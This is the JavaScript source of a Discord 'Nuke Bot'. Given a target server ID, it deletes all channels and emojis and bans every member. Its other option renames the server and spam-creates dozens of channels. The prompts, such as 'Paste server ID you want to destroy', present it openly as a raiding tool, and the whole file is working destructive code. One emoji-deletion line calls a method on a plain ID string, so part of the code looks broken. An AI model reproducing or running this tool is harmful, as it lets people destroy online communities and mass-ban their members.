const readline = require('readline').createInterface({
    input: process.stdin,
    output: process.stdout
});
const Discord = require("discord.js");
const client = new Discord.Client();
const config = require("./config.json");
const ascii = require('ascii-text-generator');


function clearCMD () {
    console.log('\033[2J');
}

function exit() {
    console.log("\n\nPress any key to continue...")
    process.stdin.setRawMode(true);
    process.stdin.resume();
    process.stdin.on('data', process.exit.bind(process, 0));
}

function nukeBot() {
    console.log(`${ascii("NUKE BOT","2")}`)
    console.log(`\n000000000000000000000000000000000000000000000000000000000000\n\n`)
}

client.on('ready', () => {
    clearCMD()

    console.log("========================")
    console.log("Logged in as " +client.user.tag)
    console.log("ID: " +client.user.id)
    console.log(`Invite link: https://discordapp.com/oauth2/authorize?client_id=${client.user.id}&scope=bot&permissions=805445686`)
    console.log("========================")

    setTimeout(function(){ clearCMD() }, 4000);
})

setTimeout(function() {                                                                     
    nukeBot();
    console.log(`Welcome to Nuke Bot created by Shaz! Paste server ID you want to destroy below, keep in mind bot must be in the server and bot's role must be as high as possible.\n`)
    
    readline.question(``, (type) => {
        if (isNaN(type)) {
            clearCMD();
            nukeBot();
            console.log(`${type} is not a number! Server ID looks like that: 532783449988268043`)
            exit();
        } else {
            if (!client.guilds.get(type)) {
                clearCMD();
                nukeBot();
                console.log("An error occured. There might be few reasons why it happened:\n-The guild doesn't exist\n-The bot is not in the server.")
                exit();
            } else {
                let guild = type
                clearCMD();
                nukeBot();
                console.log(`I see you want to nuke ${client.guilds.get(type).name}. Great choice!\n\n`)
                readline.question(`What do you want to with them?\n 1 - Delete all emojis, channels, invites, webhooks and ban all members\n 2 - Rename server name and create few channels of your choice\n\n`, (type2) => {
                    if (type2 == "1") {
                        clearCMD();
                        nukeBot();

                        client.guilds.get(guild).channels.forEach(c => {
                            c.delete();
                            console.info(`Deleted channel ${c.name}`);
                        });

                        client.guilds.get(guild).emojis.forEach(e => {
                            guild.deleteEmoji(e);
                            console.info(`Deleted emoji ${e.name}`);
                        });

                        client.guilds.get(guild).members.forEach(m => {
                            m.ban();
                            console.info(`Banned user ${m.user.username}`);
                        });

                        setTimeout(function() {
                            clearCMD();
                            nukeBot();
                            console.log("Operation Completed!")
                            exit();
                        }, 1500);


                        
                    } else if (type2 == "2") {
                        clearCMD();
                        nukeBot();
                        readline.question("What do you want rename guild to?\n\n", (choice2) => {
                            clearCMD();
                            nukeBot();
                            client.guilds.get(guild).setName(choice2);
                            setTimeout(function() {
                                client.guilds.get(guild).createChannel(choice2)
                                client.guilds.get(guild).createChannel(choice2)
                            }, 500);
                            setTimeout(function() {
                                client.guilds.get(guild).createChannel(choice2)
                                client.guilds.get(guild).createChannel(choice2)
                            }, 500);
                            setTimeout(function() {
                                client.guilds.get(guild).createChannel(choice2)
                                client.guilds.get(guild).createChannel(choice2)
                            }, 500);
                            setTimeout(function() {
                                client.guilds.get(guild).createChannel(choice2)
                                client.guilds.get(guild).createChannel(choice2)
                            }, 500);
                            setTimeout(function() {
                                client.guilds.get(guild).createChannel(choice2)
                                client.guilds.get(guild).createChannel(choice2)
                            }, 500);
                            setTimeout(function() {
                                client.guilds.get(guild).createChannel(choice2)
                                client.guilds.get(guild).createChannel(choice2)
                            }, 500);
                            setTimeout(function() {
                                client.guilds.get(guild).createChannel(choice2)
                                client.guilds.get(guild).createChannel(choice2)
                            }, 500);
                            setTimeout(function() {
                                client.guilds.get(guild).createChannel(choice2)
                                client.guilds.get(guild).createChannel(choice2)
                            }, 500);
                            setTimeout(function() {
                                client.guilds.get(guild).createChannel(choice2)
                                client.guilds.get(guild).createChannel(choice2)
                            }, 500);
                            setTimeout(function() {
                                client.guilds.get(guild).createChannel(choice2)
                                client.guilds.get(guild).createChannel(choice2)
                            }, 500);
                            setTimeout(function() {
                                client.guilds.get(guild).createChannel(choice2)
                                client.guilds.get(guild).createChannel(choice2)
                            }, 500);
                            setTimeout(function() {
                                client.guilds.get(guild).createChannel(choice2)
                                client.guilds.get(guild).createChannel(choice2)
                            }, 500);
                            setTimeout(function() {
                                client.guilds.get(guild).createChannel(choice2)
                                client.guilds.get(guild).createChannel(choice2)
                            }, 500);
                            setTimeout(function() {
                                client.guilds.get(guild).createChannel(choice2)
                                client.guilds.get(guild).createChannel(choice2)
                            }, 500);
                            setTimeout(function() {
                                client.guilds.get(guild).createChannel(choice2)
                                client.guilds.get(guild).createChannel(choice2)
                            }, 500);
                            setTimeout(function() {
                                client.guilds.get(guild).createChannel(choice2)
                                client.guilds.get(guild).createChannel(choice2)
                            }, 500);
                            setTimeout(function() {
                                client.guilds.get(guild).createChannel(choice2)
                                client.guilds.get(guild).createChannel(choice2)
                            }, 500);
                            setTimeout(function() {
                                client.guilds.get(guild).createChannel(choice2)
                                client.guilds.get(guild).createChannel(choice2)
                            }, 500);
                            setTimeout(function() {
                                client.guilds.get(guild).createChannel(choice2)
                                client.guilds.get(guild).createChannel(choice2)
                            }, 500);
                            setTimeout(function() {
                                client.guilds.get(guild).createChannel(choice2)
                                client.guilds.get(guild).createChannel(choice2)
                            }, 500);
                            setTimeout(function() {
                                client.guilds.get(guild).createChannel(choice2)
                                client.guilds.get(guild).createChannel(choice2)
                            }, 500);
                            setTimeout(function() {
                                client.guilds.get(guild).createChannel(choice2)
                                client.guilds.get(guild).createChannel(choice2)
                            }, 500);

                            setTimeout(function() {
                                clearCMD();
                                nukeBot();
                                console.log("Operation Completed!")
                                exit();
                            }, 21000);
                        })
                    } else {
                        clearCMD();
                        nukeBot();
                        console.log("That is not correct answer. Exiting now...")
                    }
                })
            }
        }
    })
}, 5500);

if (!config.token) {
    throw new Error("Token not found. Make sure to fill it in config.json file!")
} else {
    client.login(config.token)
}